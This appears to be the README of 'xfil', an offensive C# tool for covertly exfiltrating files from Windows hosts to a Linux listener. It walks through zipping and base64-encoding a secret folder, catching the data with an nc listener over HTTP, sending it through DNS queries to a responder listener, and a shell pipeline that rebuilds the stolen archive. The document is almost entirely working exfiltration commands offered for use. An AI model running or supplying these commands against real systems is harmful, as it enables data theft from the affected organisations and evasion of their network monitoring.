# xfil
Simple C# program to exfiltrate data/files through covert channels from windows to Linux.

## Compilation
* If you are targeting Windows 7 use *.NET Framework 3.5* when compiling.
* If you are targeting Windows 10 use *.NET Framework 4.0* when compiling. 
* To use the .exe you need the Ionic.zip.dll too, you can use BoxedAPP to merge them into a standalone .exe ( the release .exe is already merged with this .dll)
## Compiled binaries
Check the releases.


## Receive data
### Zip and Encode (REQUIRED)
```bash
# To exfiltrate files or folders you need to zip them and encode the zip in base64
xfil.exe /encode secret_folder secret.zip
```

### HTTP EXFIL
```bash
# Prepare listener to catch the base64
echo -e "HTTP/1.1 200 OK\r\n\r\n<h1>Host is live</h1>" | sudo nc -vl -p 9090
# Windows
xfil.exe /http http://192.168.1.53:9090/ secret.zip.b64
```

### DNS EXFIL
```bash
# Listener with responder
sudo ./responder.py  -i IP/iface
# Windows
xfil.exe /dns listener_ip  file.zip.b64
```

```bash
# After getting the xfil save all of the responder output and then parse it to the final exfiltrated file
cat responder_out.txt | awk -F" " '{print $10}' | awk -F"." '{print $2}' | tr -d '\n' | xxd -r -p | base64 -d >> secret.zip
```

### TO-DO
* Add DNS exfil **[ DONE ]**
* Add HTTP exfil **[ DONE ]**
* Add base64 encoding **[ DONE ]**
